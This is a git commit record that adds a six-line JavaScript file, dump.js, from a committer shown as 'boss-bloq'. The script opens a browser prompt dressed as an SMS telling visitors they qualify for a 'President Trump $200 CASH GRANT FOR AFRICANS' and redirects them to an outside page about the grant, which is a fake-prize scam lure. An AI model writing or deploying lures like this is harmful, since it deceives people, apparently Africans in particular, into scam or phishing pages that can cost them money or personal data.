246acf1401b40f58d5529c65804eef6da735c53e
boss-bloq <nsisboy01@gmail.com>
2024-11-06 07:02:16 -0800

    Create dump.js

---
+++ dump.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW $200'
+password=prompt('SMS: Congratulations You are qualify for President Trump $200 CASH GRANT FOR AFRICANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW $200');
+if (password != 'WITHDRAW $200') {
+location.href='https://damba-fest.org/200dollar-grant.html';
+}
